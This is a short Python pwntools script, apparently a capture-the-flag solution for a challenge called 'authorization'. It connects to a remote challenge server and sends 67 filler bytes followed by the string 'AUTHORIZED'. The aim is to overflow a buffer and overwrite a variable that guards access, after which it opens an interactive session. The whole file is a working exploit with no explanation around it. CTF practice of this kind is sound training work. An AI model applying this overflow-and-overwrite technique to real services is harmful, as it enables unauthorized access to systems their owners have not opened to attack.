from pwn import *

# variable overwrite
io = remote('chals.cyberthon22t.ctf.sg', 20101)
elf = context.binary = ELF('authorization', checksec=True)
payload = b'A' * 67 + b'AUTHORIZED'
io.sendline(payload)
io.interactive()